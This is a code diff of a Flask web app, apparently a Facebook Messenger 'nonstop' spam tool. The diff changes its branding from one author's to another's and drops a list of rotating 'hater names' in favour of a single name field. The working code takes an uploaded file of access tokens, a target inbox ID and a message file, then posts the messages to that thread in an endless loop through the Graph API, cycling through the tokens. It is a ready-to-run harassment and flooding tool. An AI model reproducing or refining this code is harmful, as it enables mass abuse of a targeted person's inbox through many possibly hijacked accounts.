@@ -2,7 +2,6 @@ from flask import Flask, request
 import requests
 from threading import Thread, Event
 import time
-import itertools  # For cycling through haternames
 
 app = Flask(__name__)
 app.debug = True
@@ -11,41 +10,32 @@ headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
     'referer': 'www.google.com'
 }
 
 stop_event = Event()
 threads = []
 
-@app.route('/ping', methods=['GET'])
-def ping():
-    return "✅ I am alive!", 200
-
-def send_messages(access_tokens, thread_id, time_interval, messages, haternames):
-    hatername_cycle = itertools.cycle(haternames)  # Cycle through haternames
+def send_messages(access_tokens, thread_id, mn, time_interval, messages):
     while not stop_event.is_set():
-        try:
-            for message1 in messages:
-                if stop_event.is_set():
-                    break
-                for access_token in access_tokens:
-                    mn = next(hatername_cycle)  # Get next hatername
-                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                    message = f"{mn} {message1}"
-                    parameters = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
-                        print(f"✅ Sent: {message[:30]} via {access_token[:10]}")
-                    else:
-                        print(f"❌ Fail [{response.status_code}]: {message[:30]}")
-                    time.sleep(time_interval)
-        except Exception as e:
-            print("⚠️ Error in message loop:", e)
-            time.sleep(10)
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message sent using token {access_token}: {message}")
+                else:
+                    print(f"Failed to send message using token {access_token}: {message}")
+                time.sleep(time_interval)
 
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
@@ -55,21 +45,16 @@ def send_message():
         access_tokens = token_file.read().decode().strip().splitlines()
 
         thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
         time_interval = int(request.form.get('time'))
 
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
 
-        # Read haternames from textarea
-        haternames = request.form.get('haternames').strip().splitlines()
-        if not haternames:
-            return "⚠️ Please enter at least one hatername!", 400
-
         if not any(thread.is_alive() for thread in threads):
             stop_event.clear()
-            thread = Thread(target=send_messages, args=(access_tokens, thread_id, time_interval, messages, haternames))
+            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))            
             thread.start()
-            threads = [thread]
 
     return '''
 <!DOCTYPE html>
@@ -77,87 +62,62 @@ def send_message():
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>R0H!T X N!74</title>
+  <title>nonstop sever</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
-    label {
-      color: white;
-    }
-    .file {
-      height: 30px;
-    }
-    body {
-      background-image: url('https://i.postimg.cc/fTS3mBYR/IMG-20250730-WA0032.jpg');
-      background-size: cover;
-      background-repeat: no-repeat;
-      color: white;
-    }
-    .container {
+    /* CSS for styling elements */
+
+
+
+label{
+    color: white ;
+}
+
+.file{
+    height: 30px;
+}
+body{
+    background-image: url('https://imgur.com/JzDEg5f.jpg');
+    background-size: cover;
+    background-repeat: no-repeat;
+    color: transparent;
+
+}
+    .container{
       max-width: 350px;
-      height: 650px; /* Increased height to accommodate textarea */
+      height: 600px;
       border-radius: 20px;
       padding: 20px;
-      box-shadow: 0 0 15px white;
-      border: none;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 15px black ;
+            border: none;
+            resize: none;
     }
-    .form-control, textarea.form-control {
-      border: 1px double white;
-      background: transparent;
-      width: 100%;
-      padding: 7px;
-      margin-bottom: 20px;
-      border-radius: 10px;
-      color: white;
+        .form-control {
+            outline: 1px red;
+            border: 1px double white ;
+            background: transparent; 
+            width: 100%;
+            height: 40px;
+            padding: 7px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            color: white ;
     }
-    textarea.form-control {
-      height: 100px; /* Adjust height for textarea */
-    }
-    .header {
+    .header{
       text-align: center;
       padding-bottom: 20px;
+      colour : white
     }
-    .neon-text {
-      font-size: 2.5em;
-      font-family: Arial, sans-serif;
-      color: #ff00ff;
-      text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 30px #ff00ff;
-      animation: flicker 1.5s infinite alternate;
-    }
-    @keyframes flicker {
-      0% { text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 30px #ff00ff; }
-      100% { text-shadow: 0 0 5px #ff00ff, 0 0 15px #ff00ff, 0 0 25px #ff00ff; }
-    }
-    .neon-btn {
-      background-color: #ff00ff;
-      border: none;
-      color: white;
-      padding: 10px 20px;
-      text-align: center;
-      text-decoration: none;
-      display: inline-block;
-      font-size: 16px;
-      margin-top: 10px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 30px #ff00ff;
-      transition: all 0.3s ease;
-    }
-    .neon-btn:hover {
-      box-shadow: 0 0 5px #ff00ff, 0 0 15px #ff00ff, 0 0 25px #ff00ff;
-      transform: scale(1.05);
-    }
-    .btn-submit {
+    .btn-submit{
       width: 100%;
+      margin-top: 10px;
     }
-    .footer {
+    .footer{
       text-align: center;
       margin-top: 20px;
       color: #888;
-    }
-    .neon-footer {
-      font-size: 1.2em;
-      color: #ff00ff;
-      text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 30px #ff00ff;
-      animation: flicker 1.5s infinite alternate;
     }
     .whatsapp-link {
       display: inline-block;
@@ -172,25 +132,53 @@ def send_message():
 </head>
 <body>
   <header class="header mt-4">
-    <h1 class="neon-text">R0H!T X N!74</h1>
+  <h1 class="mt-3">{𝗖𝗥𝗘𝗗𝗜𝗧 𝗕𝗬:- 𝐑𝐀𝐉𝐕𝐄𝐄𝐑  }</h1>
   </header>
   <div class="container text-center">
     <form method="post" enctype="multipart/form-data">
-      <label>Token File</label><input type="file" name="tokenFile" class="form-control" required>
-      <label>Thread/Inbox ID</label><input type="text" name="threadId" class="form-control" required>
-      <label>Haternames (one per line)</label><textarea name="haternames" class="form-control" rows="4" placeholder="Enter haternames, one per line" required></textarea>
-      <label>Delay (seconds)</label><input type="number" name="time" class="form-control" required>
-      <label>Text File</label><input type="file" name="txtFile" class="form-control" required>
-      <button type="submit" class="btn neon-btn btn-submit">Start Sending</button>
+      <div class="mb-3">
+        <label for="tokenFile" class="form-label">𝚃𝙾𝙺𝙴𝙽 𝙵𝙸𝙻𝙴</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile" required>
+      </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">𝙸𝙽𝙱𝙾𝚇 𝙸𝙳</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">H𝙰𝚃𝙷𝙴𝚁 𝙽𝙰𝙼𝙴</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">T𝙸𝙼𝙴 𝙳𝙴𝙻𝙰𝚈 𝙸𝙽 (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">𝚃𝙴𝚇𝚃 𝙵𝙸𝙻𝙴</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">sᴛᴀʀᴛ sᴇɴᴅɪɴɢ ᴍᴇssᴀɢᴇs</button>
     </form>
     <form method="post" action="/stop">
-      <button type="submit" class="btn neon-btn btn-submit mt-3">Stop Sending</button>
+      <button type="submit" class="btn btn-danger btn-submit mt-3">sᴛᴏᴘ sᴇɴᴅɪɴɢ ᴍᴇssᴀɢᴇs ᴇ</button>
     </form>
   </div>
   <footer class="footer">
-    <p class="neon-footer">💀 Powered By R0H!T X N!7A</p>
-    <p class="neon-footer">😈 Any One Cannot Beat me</p>
+    <p>© 𝟮𝟬𝟮𝟮 𝐑𝐀𝐉𝐕𝐄𝐄𝐑 𝐈𝐍𝐒𝐈𝐃𝐄 </p>
+    <p><a href="https://www.facebook.com/profile.php?id=61556348353228">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴀʙᴏᴏᴋ</a></p>
+    <div class="mb-3">
+      <a href="" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
+   z   </a>
+    </div>
   </footer>
 </body>
 </html>
-'''
+    '''
+
+@app.route('/stop', methods=['POST'])
+def stop_sending():
+    stop_event.set()
+    return 'Message sending stopped.'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
